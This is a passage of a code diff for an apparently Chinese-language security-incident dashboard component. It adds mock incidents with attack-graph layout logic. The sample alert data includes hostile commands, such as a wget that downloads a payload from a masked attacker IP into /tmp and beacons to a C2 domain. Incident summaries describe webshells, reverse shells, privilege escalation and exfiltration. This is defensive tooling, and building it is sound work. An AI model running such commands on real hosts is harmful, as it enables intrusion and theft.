cdn-update.**.top/beacon，返回 204', 'z16'], ['b39', '23:41:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16'], ['b40', '23:42:05', '定时外联', '命令控制', 'T1071.001 Web 协议', '每次请求 cdn-update.**.top/beacon，返回 204', 'z16']],
+          plan: ['终止伪装的 [kworker] 进程及其父进程链，恢复 healthcheck.sh，删除 /var/cache/.fonts 下的文件，并封禁 cdn-update.**.top。', [['终止恶意进程树', 'sh · PID 31006', ''], ['隔离落地文件', '/var/cache/.fonts/（3 个文件）', ''], ['封禁域名', 'cdn-update.**.top', '']]], recs: [] },
         { id: 'INC-3190', n: 'SSH 暴力破解后登录', lv: '高危', h: 'api-01', st0: '处置中', tm: '08:41', entry: 'SSH 暴力破解', first: '08:41:10', last: '08:43:00',
           ai: ['08:44', '确认入侵', '90%', '222.186.**.71 爆破成功后以 ops 登录，下载并准备执行 /tmp/k。', ['登录后立即下载并赋予执行权限']],
           main: ['s3', 'k1', 'k2'], br: [], al: [['e1', '08:41:10', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'ops 从 222.186.**.71 登录', 'k1'], ['e2', '08:43:00', '下载可疑文件', '执行', 'T1105 入口工具传输', 'wget -q 222.186.**.71/k -O /tmp/k', 'k2']],
@@ -2547,7 +3168,7 @@ class Component extends DCLogic {
         const L = RE(x); if (L.length) return L.some((y) => y.r === 'ing' || y.r === 'fail') ? '处置中' : '待验证';
         return vd0[x.id] === 'real' ? '调查中' : x.st0; };
       const STC = { '待研判': 'kc-tag warn', '调查中': 'kc-tag info', '处置中': 'kc-tag info', '待验证': 'kc-tag ok', '已关闭': 'kc-tag mut', '已关闭 · 误报': 'kc-tag mut' };
-      const SLA = { 'INC-3201': ['响应', '已超时 12 分钟', 1], 'INC-3202': ['响应', '剩 18 分钟'], 'INC-3205': ['响应', '剩 2 小时 18 分'], 'INC-3190': ['处置', '剩 41 分钟'], 'INC-3206': ['响应', '剩 28 分钟'] };
+      const SLA = { 'INC-3201': ['响应', '已超时 12 分钟', 1], 'INC-3202': ['响应', '剩 18 分钟'], 'INC-3205': ['响应', '剩 2 小时 18 分'], 'INC-3207': ['响应', '剩 26 分钟'], 'INC-3212': ['响应', '剩 9 分钟'], 'INC-3213': ['响应', '剩 52 分钟'], 'INC-3190': ['处置', '剩 41 分钟'], 'INC-3206': ['响应', '剩 28 分钟'] };
       const slaOf = (x) => { const s = stOf(x); if (s === '待验证' || s.indexOf('已关闭') === 0) return null; const v = SLA[x.id]; if (!v) return null; return s !== '待研判' && v[0] === '响应' ? ['处置', '剩 3 小时 52 分'] : v; };
       { const m = {}; INC.forEach((x) => { m[x.id] = stOf(x); }); const js = JSON.stringify(m); if (js !== this.__isJs) { this.__isJs = js; try { localStorage.setItem('dxIncSt', js); } catch (y) {} } }
       const incId = IM[st.huI] ? st.huI : IM[nf['事件']] ? nf['事件'] : 'INC-3201';
@@ -2666,6 +3287,15 @@ class Component extends DCLogic {
         'INC-3198': ['攻击者暴力破解 deploy 账号后读取 /etc/shadow 获取凭据，并写入 root 公钥以便长期免密登录。',
           '/etc/shadow 已被读取，系统账号的密码哈希可能泄露；新增公钥已删除，来源 IP 已封禁。', ['c1', 'c3'],
           ['检查其他主机上是否有同密码的 deploy 账号', '关注后续是否有用泄露凭据登录的行为', '为 SSH 登录开启二次身份认证']],
+        'INC-3213': ['攻击者替换了运维账号的健康检查脚本，通过很深的进程链拉起无签名后门，并把进程名伪装成内核线程，长期驻留并定时回连。',
+          '后门已驻留近 24 小时，期间每隔一段时间外联一次，凌晨 3 点有一次密集外联，可能在接收新指令。', ['m1', 'm2', 'm3'],
+          ['核对 /opt/ops 下其他脚本是否被改动', '排查同一运维账号登录过的主机', '检查凌晨 3 点前后的出站流量']],
+        'INC-3212': ['攻击者利用上传漏洞写入 WebShell，反弹 Shell 后用 pkexec 漏洞提权到 root，建立多处持久化并加载 rootkit 隐藏自己，导出数据库打包外传，再用窃取的私钥登录同网段主机。',
+          '数据库已被导出并外传 214MB；10.0.1.12、10.0.1.13 已被 SSH 登录，存在继续扩散的风险；日志已被删除，需要从安全卫士留存的记录还原。', ['k1', 'k5', 'k18', 'k21'],
+          ['检查 10.0.1.12 / 10.0.1.13 的进程和持久化', '轮换数据库与 root 密钥', '修补上传接口并升级 polkit']],
+        'INC-3207': ['攻击者篡改 root 计划任务，定时从 91.215.**.4 拉取脚本，在主机上运行挖矿程序，并用主机上的 SSH 凭据向同网段扩散。',
+          'CPU 持续被占用 780%，防火墙规则已被清空；10.0.2.31 已执行同样的下载命令，存在扩散风险。', ['h1', 'h4', 'h6'],
+          ['检查 10.0.2.31 及同网段主机的计划任务', '核对 root 的 authorized_keys 和 known_hosts', '恢复 iptables 规则']],
         'INC-3205': ['可能是攻击者利用应用漏洞执行编码命令并下载脚本，也可能是运维脚本的正常行为，需要人工确认。',
           'x.sh 已下载，暂未发现执行、外联或持久化记录。', ['d1', 'd2'],
           ['向应用负责人确认是否有调用 base64 命令的运维脚本', '检查 order-service 近期的请求日志', '分析 x.sh 的内容']],
@@ -2756,6 +3386,195 @@ class Component extends DCLogic {
       ls.nxHas = NX.length > 0 && !handled(inc);
       ls.nx = NX.map(([n, tg]) => { const k = n + '|' + tg; const inL = items.some((x) => x.k === k || (x.n.indexOf(n.replace('终止', '')) >= 0 && x.tg.indexOf(tg.split(' · ')[0]) >= 0)); return { n, e: inL ? '✓ 已在清单' : '加入方案', c: inL ? 'hu-in' : '',
         t: inL ? ev(() => {}) : ev(() => { const ad = Object.assign({}, st.huAdd || {}); ad[incId] = addK.concat([k]); S({ huAdd: ad, huNo: false }); toast('已加入处置方案：' + n + ' ' + tg); }) }; });
+      /* hg 画布：攻击链（左→右，按时间）/ 进程树（上→下，父子） */
+      { const isTree = vt === '进程树'; const live = !handled(inc); const pend = aSt === '待研判';
+        const fs = !!st.hgFs; const CC = live ? (pend ? 'r' : 'b') : s0.indexOf('已关闭') === 0 ? 'g' : 'b'; const KIND = { ip: '网络地址', evt: '入口事件', host: '受害主机', proc: '进程', file: '文件' };
+        const ICG = { ip: 'ip', evt: 'up', host: 'srv', proc: 'proc', file: 'file' };
+        const CW = isTree ? 232 : 184, CH = isTree ? 92 : 88, TAG = 22, GX = isTree ? 24 : 40, GY = isTree ? 52 : 34, PAD = 36, R = 10;
+        const M0 = inc.main; const rIds = isTree ? ord.slice() : M0.concat(inc.br);
+        const rPar = (id) => { const pp = PRC[id] && PRC[id][2]; if (isTree) return pp && rIds.indexOf(pp) >= 0 ? pp : ''; const i = M0.indexOf(id); if (i >= 0) return i > 0 ? M0[i - 1] : ''; return pp && rIds.indexOf(pp) >= 0 ? pp : inc.brAt; };
+        const rKids = {}; rIds.forEach((k) => { const p = rPar(k); (rKids[p] = rKids[p] || []).push(k); });
+        const hasAl = {}; const sub = (id) => { if (hasAl[id] !== undefined) return hasAl[id]; hasAl[id] = alOf(id).length > 0 || (rKids[id] || []).some(sub); return hasAl[id]; }; rIds.forEach(sub);
+        const q = String(st.hgQ || '').trim().toLowerCase(); const stg0 = st.hgSt || ''; const act = !!(q || stg0);
+        const mOne = (id) => { if (!act) return false; const p = PRC[id]; const d = ND(id); const hay = (p ? p[0] + ' ' + p[1] + ' ' + p[4] : d[1] + ' ' + d[2]).toLowerCase(); return (!q || hay.indexOf(q) >= 0) && (!stg0 || alOf(id).some((a2) => a2[3] === stg0)); };
+        const subM = {}; const smt = (id) => { if (subM[id] !== undefined) return subM[id]; subM[id] = mOne(id) || (rKids[id] || []).some(smt); return subM[id]; }; rIds.forEach(smt);
+        const imp = (id) => sub(id) || (!isTree && M0.indexOf(id) >= 0) || (act && smt(id));
+        const nmOf = (id) => PRC[id] ? PRC[id][0] : ND(id)[1];
+        const cntD = (id) => 1 + (rKids[id] || []).reduce((a2, c) => a2 + cntD(c), 0);
+        const showAll = !!st.hgAll; const exK = incId + '|' + vt; const exM = (st.hgEx || {})[exK] || {};
+        const V = []; const VM = {};
+        const walk = (p, vp) => { const ch = rKids[p] || []; const byN = {}; ch.forEach((c) => { if (PRC[c] && !(rKids[c] || []).length && M0.indexOf(c) < 0) (byN[nmOf(c)] = byN[nmOf(c)] || []).push(c); });
+          const items = []; const seen = {}; ch.forEach((c) => { const g = byN[nmOf(c)]; if (g && g.length >= 3 && g.indexOf(c) >= 0) { if (!seen[nmOf(c)]) { seen[nmOf(c)] = 1; items.push({ g: 1, m: g, nm: nmOf(c) }); } } else items.push({ g: 0, id: c }); });
+          const isI = (it) => it.g ? it.m.some(imp) : imp(it.id); const open = showAll || !!exM[p];
+          const vis = open ? items : items.filter(isI); const hid = items.filter((it) => vis.indexOf(it) < 0);
+          vis.forEach((it) => { if (it.g) { const gid = 'g:' + p + ':' + it.nm; const o = { id: gid, par: vp, t: 'g', m: it.m, nm: it.nm }; V.push(o); VM[gid] = o; } else { const o = { id: it.id, par: vp, t: 'n' }; V.push(o); VM[it.id] = o; walk(it.id, it.id); } });
+          if (hid.length) { const o = { id: 'f:' + p, par: vp, t: 'f', fp: p, n: hid.reduce((a2, it) => a2 + (it.g ? it.m.length : cntD(it.id)), 0), names: hid.map((it) => it.g ? it.nm : nmOf(it.id)) }; V.push(o); VM[o.id] = o; }
+          else if (!showAll && exM[p] && items.some((it) => !isI(it))) { const o = { id: 'f:' + p, par: vp, t: 'f', fp: p, close: 1, n: items.filter((it) => !isI(it)).reduce((a2, it) => a2 + (it.g ? it.m.length : cntD(it.id)), 0) }; V.push(o); VM[o.id] = o; } };
+        walk('', '');
+        const ids = V.map((o) => o.id); const par = (id) => VM[id].par;
+        const mtO = (o) => act && (o.t === 'n' ? mOne(o.id) : o.t === 'g' ? o.m.some(mOne) : false); const MT = V.filter(mtO); const qi = MT.length ? Math.min(st.hgQi || 0, MT.length - 1) : 0; const curM = MT.length ? MT[qi].id : '';
+        const vsub = (id) => { const o = VM[id]; return o.t === 'n' ? sub(id) : o.t === 'g' ? o.m.some((x) => alOf(x).length) : false; };
+        const kids = {}; ids.forEach((k) => { const p = par(k); (kids[p] = kids[p] || []).push(k); });
+        const P = {}; let W, H; const rowOf = {}; const rowTop = []; const dirOf = {}; const colOf = {}; const trk = {}; const grd = {};
+        if (isTree) { const pos = {}; let slot = 0, maxD = 0; 
+          const lay = (id, d) => { maxD = Math.max(maxD, d); const ch = kids[id] || []; if (!ch.length) { pos[id] = [d, slot++]; return; }
+            /* 叶子子进程很多时折行排成网格，避免一层铺得很宽 */
+            const lv = ch.filter((c) => !(kids[c] || []).length);
+            if (lv.length > 6) { ch.filter((c) => lv.indexOf(c) < 0).forEach((c) => lay(c, d + 1)); const cols = Math.min(6, Math.ceil(lv.length / Math.ceil(lv.length / 6))); const s0 = slot;
+              lv.forEach((c, i) => { const rr = Math.floor(i / cols); pos[c] = [d + 1 + rr, s0 + i % cols]; if (rr) grd[c] = s0; maxD = Math.max(maxD, d + 1 + rr); }); slot += cols; }
+            else ch.forEach((c) => lay(c, d + 1));
+            const ss = ch.map((c) => pos[c][1]); pos[id] = [d, (Math.min.apply(null, ss) + Math.max.apply(null, ss)) / 2]; };
+          (kids[''] || []).forEach((r) => lay(r, 0));
+          ids.forEach((id) => { const [d, s2] = pos[id]; P[id] = [PAD + s2 * (CW + GX), PAD + TAG + d * (CH + TAG + GY)]; });
+          W = PAD * 2 + slot * (CW + GX) - GX; H = PAD * 2 + (maxD + 1) * (CH + TAG + GY) - GY; }
+        else { const C = fs ? 4 : 3; const M = M0.filter((id) => VM[id]); const BS = TAG + CH + 12; let y = PAD + TAG, wx = 0;
+          for (let r = 0; r * C < M.length; r++) { rowTop[r] = y; const row = M.slice(r * C, r * C + C); let stack = 0;
+            row.forEach((id, c) => { P[id] = [PAD + c * (CW + GX), y]; rowOf[id] = r; wx = Math.max(wx, P[id][0] + CW); });
+            let k2 = 0; row.forEach((mid, c) => { const dir = c === C - 1 && C > 1 ? -1 : 1; const [mx] = P[mid];
+              /* 分支多时按列排开：每列放若干棵完整子树，避免一根很长的竖列 */
+              const grp = []; const st2 = (pid, d, out) => (kids[pid] || []).forEach((id) => { if (M0.indexOf(id) >= 0) return; out.push([id, d]); st2(id, d + 1, out); });
+              (kids[mid] || []).forEach((id) => { if (M0.indexOf(id) >= 0) return; const out = [[id, 1]]; st2(id, 2, out); grp.push(out); });
+              const n = grp.reduce((a2, g) => a2 + g.length, 0); const avail = dir === 1 ? C - c : C - 1; const cols = n > 6 ? Math.max(1, Math.min(avail, Math.ceil(n / 6))) : 1; const per = Math.ceil(n / cols);
+              const y0 = y + CH + 12 + TAG + k2 * BS; let j = 0, cnt = 0, mxr = 0;
+              grp.forEach((g) => { if (cnt && cnt + g.length > per && j < cols - 1) { j++; cnt = 0; } const cx0 = mx + dir * j * (CW + GX);
+                g.forEach(([id, d]) => { P[id] = [cx0 + dir * 28 * d, y0 + cnt * BS]; dirOf[id] = dir; rowOf[id] = r; colOf[id] = j; trk[id] = { tx: cx0 + (dir === 1 ? 14 : CW - 14), ty: y0 - TAG - 8 }; wx = Math.max(wx, P[id][0] + CW); cnt++; mxr = Math.max(mxr, cnt); }); });
+              k2 += mxr; }); stack = k2 ? k2 * BS + 4 : 0;
+            y += CH + stack + GY + TAG; }
+          W = wx + PAD; H = y - GY - TAG + PAD; }
+        const XY = (id) => P[id];
+        const focN = VM[selN] ? selN : (V.find((o) => o.t === 'g' && o.m.indexOf(selN) >= 0) || {}).id || ''; const expl = !!st.huN && st.huN === selN && !!focN;
+        const keep = new Set(); if (expl) { const dn = (id) => { keep.add(id); (kids[id] || []).forEach(dn); }; dn(focN); }
+        const fd = (id) => expl && !keep.has(id);
+        const sel = (id) => ev(() => S({ huN: st.huN === id ? '' : id, huNo: false, huAll: 0 }));
+        ls.hg = { k: incId + '|' + vt + '|' + (fs ? 1 : 0) + '|' + (qOn ? 1 : 0), o: isTree ? 'v' : 'h', W, H, fs, nfs: !fs, fsN: fs ? '退出全屏' : '全屏查看',
+          c: 'hg ' + (isTree ? 'tree' : 'chain') + (fs ? ' fs' : '') + (st.hgFold ? ' fold' : '') + (fs && expl ? ' dwo' : '') + (live ? '' : ' done') + (act ? ' qon' : ''), dw: fs && expl,
+          fsT: ev(() => S({ hgFs: !fs })), clr: ev(() => S({ huN: '' })) };
+        ['loc', 'fit', 'out', 'one', 'in'].forEach((a) => { ls.hg['a_' + a] = (e) => { if (e && e.preventDefault) e.preventDefault(); this._hgAct(e && e.currentTarget, a); }; });
+        ls.hucC = 'kc-card hu-c' + (fs ? ' hg-fsc' : '');
+        const [sx0, sy0] = XY(P[focN] ? focN : ids[0]); ls.hg.sx = sx0 + CW / 2; ls.hg.sy = sy0 + CH / 2; { const [rx0, ry0] = XY((kids[''] || [ids[0]])[0]); ls.hg.rx = rx0 + CW / 2; ls.hg.ry = ry0 + CH / 2; }
+        const v = this._hgView && this._hgView.k === ls.hg.k ? this._hgView : { x: 24, y: 24, z: 0.9 };
+        ls.hg.tf = 'transform:translate(' + v.x + 'px,' + v.y + 'px) scale(' + v.z + ')';
+        ls.hg.bg = 'background-position:' + v.x + 'px ' + v.y + 'px;background-size:' + (20 * v.z) + 'px ' + (20 * v.z) + 'px';
+        ls.hg.zp = Math.round(v.z * 100) + '%';
+        const tsec = (t) => { const p = String(t).split(':').map(Number); return p[0] * 3600 + p[1] * 60 + (p[2] || 0); };
+        const chipOf = (k) => k ? (live ? (pend ? '待研判' : '已确认') : s0.split(' ')[0]) + (k > 1 ? ' ' + k : '') : '';
+        const chipCOf = (k) => 'hg-chip ' + (k ? CC : '');
+        const gs = st.hgGs || '';
+        ls.hg.nodes = V.map((o) => { const id = o.id; const mq = act ? (mtO(o) ? ' mt' + (id === curM ? ' cur' : '') : ' dm') : ''; const [x, y] = XY(id); const pos2 = 'left:' + x + 'px;top:' + y + 'px;width:' + CW + 'px;height:' + CH + 'px';
+          if (o.t === 'f') { const nm = o.names ? o.names.filter((v2, i2, a2) => a2.indexOf(v2) === i2) : []; return { n: o.close ? '收起 ' + o.n + ' 个无告警进程' : '+' + o.n + ' 个无告警进程', sub: o.close ? '只显示攻击路径' : nm.slice(0, 3).join('、') + (nm.length > 3 ? ' 等' : ''), tag: o.close ? '已展开' : '已折叠', w: o.close ? '点击收起' : '点击展开', r: '', rC: 'hg-r', chip: '', chipC: '', ic: 'hg-mk more', on: 'false', al: (o.close ? '收起' : '展开') + o.n + ' 个无告警进程',
+              c: 'hg-card fold' + (fd(id) ? ' fd' : '') + mq, ns: (o.close ? '−' : '+') + o.n, st: pos2, t: ev(() => S({ hgEx: Object.assign({}, st.hgEx || {}, { [exK]: Object.assign({}, exM, { [o.fp]: !o.close }) }) })), he: () => {} }; }
+          if (o.t === 'g') { const m = o.m; const p0 = PRC[m[0]]; const ak = m.reduce((a2, x2) => a2 + alOf(x2).length, 0); const al0 = m.map(alOf).find((a2) => a2.length); const pids = m.map((x2) => PRC[x2][1]); const on = gs === id || m.indexOf(selN) >= 0 && expl;
+            const rep = m.find((x2) => alOf(x2).length) || m[0]; const ts2 = m.map((x2) => PRC[x2][7]).filter(Boolean).sort();
+            return { n: o.nm + ' ×' + m.length, sub: 'PID ' + Math.min.apply(null, pids) + '–' + Math.max.apply(null, pids) + ' · ' + p0[3], tag: (al0 ? al0[0][3] + ' · ' : '') + '同名进程合并', w: p0[4], r: ts2.length ? ts2[0].slice(3) + '–' + ts2[ts2.length - 1].slice(3) : '', rC: 'hg-r', chip: chipOf(ak), chipC: chipCOf(ak), ic: 'hg-mk proc', on: on ? 'true' : 'false', al: o.nm + ' 共 ' + m.length + ' 个进程',
+              c: 'hg-card grp' + (on ? ' on' : '') + (fd(id) ? ' fd' : '') + (ak ? ' hot' : '') + mq, ns: o.nm + ' ×' + m.length, st: pos2, t: ev(() => S({ huN: rep, hgGs: gs === id ? '' : id, hgDt: '时间轴', hgFold: false, huNo: false })), he: HV('n:' + rep) }; }
+          const d = ND(id); const al = alOf(id); const k = al.length; const isP = d[0] === 'proc'; const p = PRC[id];
+          const stg = k ? al[0][3] + ' · ' + al[0][4].split(' ')[0] : ''; let tag, sb, w, r = '', rC = '';
+          if (isTree) { tag = p[3] + (k ? ' · ' + al[0][3] : ''); sb = 'PID ' + p[1] + (PRC[p[2]] ? ' · 父进程 ' + PRC[p[2]][0] + ' ' + PRC[p[2]][1] : ''); w = p[4]; r = p[5] === '无签名' ? '无签名' : '已签名'; rC = p[5] === '无签名' ? 'r' : ''; }
+          else { tag = stg || KIND[d[0]]; sb = isP ? d[2] + ' · ' + p[3] : d[2]; w = isP ? p[4] : d[5] || (d[3] && d[3][1] ? d[3][1][0] + ' ' + d[3][1][1] : d[2]); r = k ? al[0][1] : ''; }
+          const on = id === selN;
+          return { n: d[1], sub: sb, tag, w, r, rC: 'hg-r ' + rC, chip: chipOf(k), chipC: chipCOf(k),
+            ic: 'hg-mk ' + ICG[d[0]], on: on ? 'true' : 'false', al: KIND[d[0]] + ' ' + d[1] + ' ' + d[2] + (k ? '，' + k + ' 条告警' : ''),
+            c: 'hg-card' + (on ? ' on' : '') + (fd(id) ? ' fd' : '') + (k ? ' hot' : '') + (!sub(id) && !isTree ? ' mu' : '') + mq, ns: d[1], st: pos2, t: sel(id), he: HV('n:' + id) }; });
+        ls.hg.nodes.forEach((n, i2) => { const id = V[i2].id; const [x, y] = XY(id); n.id = id; n.x = x; n.y = y; n.mw = CW; n.mh = CH;
+          n.mc = 'hg-mmn' + (n.c.indexOf(' hot') >= 0 ? ' r' : '') + (n.c.indexOf(' fold') >= 0 ? ' f' : '') + (n.c.indexOf(' on') >= 0 ? ' on' : '') + (n.c.indexOf(' mt') >= 0 ? ' mt' : '') + (n.c.indexOf(' dm') >= 0 ? ' dm' : ''); });
+        ls.hg.big = rIds.length > 15 || act; ls.hg.vb = '0 0 ' + W + ' ' + H;
+        // 搜索与阶段筛选
+        const goM = (i) => { if (!MT.length) return; const j = (i + MT.length) % MT.length; const o = MT[j]; this._hgGo = o.id; S({ hgQi: j, huN: o.t === 'g' ? (o.m.find(mOne) || o.m[0]) : o.id, huNo: false }); };
+        ls.hg.q = st.hgQ || ''; ls.hg.onQ = (e) => { this._hgGo = ''; this.setState({ hgQ: e.target.value, hgQi: 0 }); };
+        ls.hg.onQk = (e) => { if (e.key === 'Enter') { e.preventDefault(); goM(qi + (this._hgGo ? (e.shiftKey ? -1 : 1) : 0)); } else if (e.key === 'Escape') { e.stopPropagation(); this.setState({ hgQ: '', hgQi: 0 }); } };
+        ls.hg.qn = act ? (MT.length ? (qi + 1) + ' / ' + MT.length : '无匹配') : ''; ls.hg.qHas = act; ls.hg.qPrev = ev(() => goM(qi - 1)); ls.hg.qNext = ev(() => goM(this._hgGo ? qi + 1 : qi)); ls.hg.qClr = ev(() => S({ hgQ: '', hgSt: '', hgQi: 0, hgSp: false }));
+        const STG = []; inc.al.forEach((a2) => { const f = STG.find((x) => x[0] === a2[3]); if (f) f[1]++; else STG.push([a2[3], 1]); });
+        ls.hg.stN = stg0 || '全部阶段'; ls.hg.stC = 'hg-stb' + (stg0 ? ' on' : '') + (st.hgSp ? ' op' : ''); ls.hg.spOpen = !!st.hgSp; ls.hg.spT = ev(() => S({ hgSp: !st.hgSp }));
+        ls.hg.stgs = [['全部阶段', inc.al.length, '']].concat(STG.map((x) => [x[0], x[1], x[0]])).map(([n, k, v2]) => ({ n, k, c: 'hg-sti' + (v2 === stg0 ? ' on' : ''), t: ev(() => { this._hgGo = ''; S({ hgSt: v2, hgSp: false, hgQi: 0 }); }) }));
+        const edges = [], dots = {};
+        ids.forEach((id, i) => { const p = par(id); if (!p) return; const [px, py] = XY(p); const [cx, cy] = XY(id); let d2, ex, ey, ln = 0;
+          if (isTree && grd[id] !== undefined) { const s1 = px + CW / 2, s2 = py + CH, m0 = s2 + GY / 2, tx = PAD + grd[id] * (CW + GX) - GX / 2, mk = cy - TAG - GY / 2 + 6, t1 = cx + CW / 2, t2 = cy; ex = s1; ey = s2;
+            ln = (m0 - s2) + Math.abs(tx - s1) + (mk - m0) + Math.abs(t1 - tx) + (t2 - mk); d2 = 'M' + s1 + ' ' + s2 + ' V' + m0 + ' H' + tx + ' V' + mk + ' H' + t1 + ' V' + t2; }
+          else if (isTree) { const s1 = px + CW / 2, s2 = py + CH, t1 = cx + CW / 2, t2 = cy - (cx === px ? 0 : 0); const m = s2 + GY / 2; ex = s1; ey = s2;
+            ln = Math.abs(s1 - t1) < 1 ? t2 - s2 : (m - s2) + Math.abs(t1 - s1) + (t2 - m); if (Math.abs(s1 - t1) < 1) d2 = 'M' + s1 + ' ' + s2 + ' V' + t2; else { const dir = t1 > s1 ? 1 : -1; d2 = 'M' + s1 + ' ' + s2 + ' V' + (m - R) + ' Q' + s1 + ' ' + m + ' ' + (s1 + dir * R) + ' ' + m + ' H' + (t1 - dir * R) + ' Q' + t1 + ' ' + m + ' ' + t1 + ' ' + (m + R) + ' V' + t2; } }
+          else if (M0.indexOf(id) < 0 && trk[id] && colOf[id] > 0 && M0.indexOf(p) >= 0) { const brL = dirOf[id] === -1; const s1 = brL ? px + CW - 14 : px + 14, s2 = py + CH, tx = trk[id].tx, yb = trk[id].ty, t1 = brL ? cx + CW : cx, t2 = cy + CH / 2; const dr = tx > s1 ? 1 : -1, dr2 = t1 > tx ? 1 : -1; ex = s1; ey = s2;
+            ln = (yb - s2) + Math.abs(tx - s1) + (t2 - yb) + Math.abs(t1 - tx);
+            d2 = 'M' + s1 + ' ' + s2 + ' V' + (yb - R) + ' Q' + s1 + ' ' + yb + ' ' + (s1 + dr * R) + ' ' + yb + ' H' + (tx - dr * R) + ' Q' + tx + ' ' + yb + ' ' + tx + ' ' + (yb + R) + ' V' + (t2 - R) + ' Q' + tx + ' ' + t2 + ' ' + (tx + dr2 * R) + ' ' + t2 + ' H' + t1; }
+          else if (M0.indexOf(id) < 0) { const brL = dirOf[id] === -1; const dr = brL ? -1 : 1; const s1 = brL ? px + CW - 14 : px + 14, s2 = py + CH, t1 = brL ? cx + CW : cx, t2 = cy + CH / 2; ex = s1; ey = s2; ln = (t2 - s2) + Math.abs(t1 - s1); d2 = 'M' + s1 + ' ' + s2 + ' V' + (t2 - R) + ' Q' + s1 + ' ' + t2 + ' ' + (s1 + dr * R) + ' ' + t2 + ' H' + t1; }
+          else { const s1 = px + CW, s2 = py + CH / 2, t1 = cx, t2 = cy + CH / 2; ex = s1; ey = s2;
+            if (rowOf[p] === rowOf[id]) { d2 = 'M' + s1 + ' ' + s2 + ' H' + t1; ln = t1 - s1; }
+            else { const m = s1 + GX / 2, yr = rowTop[rowOf[id]] - TAG - 16, f = t1 - GX / 2; ln = (m - s1) + (yr - s2) + (m - f) + (t2 - yr) + (t1 - f);
+              d2 = 'M' + s1 + ' ' + s2 + ' H' + (m - R) + ' Q' + m + ' ' + s2 + ' ' + m + ' ' + (s2 + R) + ' V' + (yr - R) + ' Q' + m + ' ' + yr + ' ' + (m - R) + ' ' + yr + ' H' + (f + R) + ' Q' + f + ' ' + yr + ' ' + f + ' ' + (yr + R) + ' V' + (t2 - R) + ' Q' + f + ' ' + t2 + ' ' + (f + R) + ' ' + t2 + ' H' + t1; } }
+          const path = vsub(id); const f = fd(id);
+          edges.push({ d: d2, flow: live && path, c: 'hg-e' + (path ? '' : ' mu') + (live && path ? (pend ? ' r' : ' b') : '') + (f ? ' fd' : ''), dl: '--len:' + Math.round(ln) + 'px;animation-delay:' + ((i * 0.37) % 2.1).toFixed(2) + 's;animation-duration:' + (1.3 + Math.min(ln, 900) / 900).toFixed(2) + 's' });
+          const dk = ex + ',' + ey; const dd = dots[dk] || { x: ex, y: ey, mu: true, f: true }; dd.mu = dd.mu && !path; dd.f = dd.f && f; dots[dk] = dd; });
+        edges.sort((a, b) => (b.c.indexOf(' mu') >= 0) - (a.c.indexOf(' mu') >= 0));
+        ls.hg.edges = edges; ls.hg.dots = Object.keys(dots).map((k) => { const d = dots[k]; return { x: d.x, y: d.y, c: 'hg-dot' + (d.mu ? ' mu' : '') + (d.f ? ' fd' : '') }; });
+        const nAl = rIds.filter((id) => alOf(id).length).length; const nP = rIds.filter((id) => PRC[id]).length;
+        ls.hg.cnt = (isTree ? nP + ' 个进程' : rIds.length + ' 个节点') + ' · ' + nAl + ' 个有告警';
+        ls.hg.canF = rIds.some((id) => !imp(id)); ls.hg.modes = [['仅攻击路径', false], ['显示全部', true]].map(([n, v2]) => ({ n, c: v2 === showAll ? 'on' : '', t: ev(() => S({ hgAll: v2, hgEx: Object.assign({}, st.hgEx || {}, { [exK]: {} }) })) }));
+        // 底部面板
+        const dt = isTree ? '告警' : st.hgDt || '时间轴'; const open = !st.hgFold;
+        ls.hg.open = open; ls.hg.foldN = open ? '收起面板' : '展开面板'; ls.hg.foldC = open ? '' : 'up'; ls.hg.foldT = ev(() => S({ hgFold: open }));
+        ls.hg.dtabs = (isTree ? [['告警', inc.al.length]] : [['时间轴', ''], ['告警', inc.al.length]]).map(([n, k]) => ({ n, k, c: 'hg-dtb' + (n === dt ? ' on' : ''), on: n === dt ? 'true' : 'false', t: ev(() => S({ hgDt: n, hgFold: false })) }));
+        ls.hg.dTr = dt === '时间轴'; ls.hg.dAl = dt === '告警';
+        const dh = this._hgDH || 200; ls.hg.dockSt = '--hg-dh:' + dh + 'px';
+        const T0 = tsec(inc.first), T1 = Math.max(tsec(inc.last), T0 + 60); const span = T1 - T0; const pad = span * 0.04; const TR = isTree ? (st.hgTr || {})[incId] : null; const a0 = TR ? TR[0] : T0 - pad, a1 = TR ? TR[1] : T1 + pad; const tA = TR ? a0 : T0, tS = TR ? a1 - a0 : span;
+        const L = (t) => ((t - a0) / (a1 - a0) * 100).toFixed(2) + '%';
+        const fmt = (t) => { const h = Math.floor(t / 3600), m = Math.floor(t / 60) % 60, s2 = Math.floor(t % 60); return String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s2).padStart(2, '0'); };
+        ls.hg.ticks = [0, 1, 2, 3, 4].map((i) => { const t = tA + tS * i / 4; return { t: fmt(t), st: 'left:' + L(t) }; });
+        const rs = Math.max(0, tsec(inc.last) - T0); const dur = rs >= 3600 ? Math.floor(rs / 3600) + ' 小时 ' + Math.round(rs % 3600 / 60) + ' 分' : rs >= 60 ? Math.floor(rs / 60) + ' 分 ' + (rs % 60) + ' 秒' : rs + ' 秒';
+        ls.hg.axL = isTree ? '进程' : '节点';
+        ls.hg.nums = [['告警', inc.al.length + ' 条'], ['涉及进程', procs.length + ' 个'], ['持续', dur], ['状态', s0]].map(([k, v2]) => ({ k, v: v2 }));
+        const ptOf = (id, y) => ({ n: y[2], tt: y[1] + ' · ' + y[2] + ' · ' + y[3] + ' · ' + y[4], st: 'left:' + L(tsec(y[1])), c: 'hg-pt ' + CC + ((tsec(y[1]) - a0) / (a1 - a0) > 0.7 ? ' rt' : '') + fc(y[0]), he: HV('a:' + y[0]), t: ev(() => S({ huN: id })) });
+        const stOfP = (id) => PRC[id] && PRC[id][7] && !alOf(id).length && tsec(PRC[id][7]) >= a0 ? [{ n: '', tt: PRC[id][7] + ' · ' + PRC[id][0] + ' 启动（PID ' + PRC[id][1] + '）', st: 'left:' + L(tsec(PRC[id][7])), c: 'hg-pt s', he: () => {}, t: ev(() => S({ huN: id })) }] : [];
+        const cluA = (id, al) => { const CL0 = (a1 - a0) * 0.02; const cs = []; al.slice().sort((p1, p2) => tsec(p1[1]) - tsec(p2[1])).forEach((y) => { const c2 = cs[cs.length - 1]; if (c2 && tsec(y[1]) - tsec(c2[c2.length - 1][1]) < CL0) c2.push(y); else cs.push([y]); });
